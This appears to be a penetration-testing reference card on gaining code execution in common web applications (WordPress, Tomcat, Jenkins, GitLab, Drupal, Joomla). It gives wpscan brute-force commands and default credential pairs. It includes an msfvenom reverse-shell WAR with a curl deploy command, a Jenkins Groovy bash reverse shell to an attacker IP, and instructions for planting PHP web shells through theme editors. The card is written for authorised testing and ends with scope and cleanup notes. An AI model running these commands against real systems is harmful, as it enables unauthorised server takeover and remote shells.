---
tool: Attacking common applications
slug: common-apps
kind: technique
stages: [exploitation]
category: WordPress, Tomcat, Jenkins, GitLab
platforms: [web, linux]
services: [http, https]
ports: [80, 443, 8080, 8443]
tags: [web, wordpress, tomcat, jenkins, gitlab, default-credentials]
attack: [T1190, T1059, T1078.001]
summary: The off-the-shelf apps that turn up on internal web ports and the quick route to code execution on each. Fingerprint the app, try default and weak credentials, then use the admin feature that runs code: a theme editor, a WAR deploy, a script console.
references:
  - The Hacker Recipes: default credentials | https://www.thehacker.recipes/web/config/default-credentials
  - HackTricks pentesting web | https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html
---

## Fingerprint first

Before attacking, confirm what the app is and its version. `whatweb http://TARGET` and the response headers, `/robots.txt`, favicon and login-page banners usually name it. Match the version to a known CVE with `searchsploit`, and only then pick the route below.

## WordPress

Enumerate users, themes and vulnerable plugins, then spray or brute the login:

```bash
wpscan --url http://TARGET --enumerate u,ap,vp --api-token TOKEN
wpscan --url http://TARGET -U admin -P passwords.txt
```

With admin, edit a theme's `404.php` (Appearance, Theme Editor) to add a PHP web shell, then request that file.

## Tomcat

The `/manager/html` app deploys a WAR. Try default pairs (`tomcat:tomcat`, `admin:admin`) or brute with the manager realm, then deploy a payload:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f war -o shell.war
curl -u tomcat:PASS --upload-file shell.war "http://TARGET:8080/manager/text/deploy?path=/shell"
```

Browse `/shell/` to fire the shell.

## Jenkins

An open or weak-credentialled instance runs Groovy at `/script`. The Script Console executes on the controller:

```groovy
def p = ["/bin/bash","-c","bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"].execute()
```

## GitLab / Drupal / Joomla

GitLab: check the version at `/help`, register if sign-up is open, and match it to a known RCE with `searchsploit gitlab`. Drupal: `droopescan scan drupal -u http://TARGET`; older cores fall to Drupalgeddon modules in Metasploit. Joomla: `joomscan -u http://TARGET`, then the administrator template editor for a PHP shell once you have admin.

## Notes

Default-credential and admin-feature RCE are high-impact and leave clear log entries, so confirm the app and the action are in scope before deploying anything, and record the app, version and the credential or feature you used. Prefer a read-only fingerprint until you are sure of the version. In-scope and authorised use only; remove any shell, WAR or theme file you plant and note it for the report.
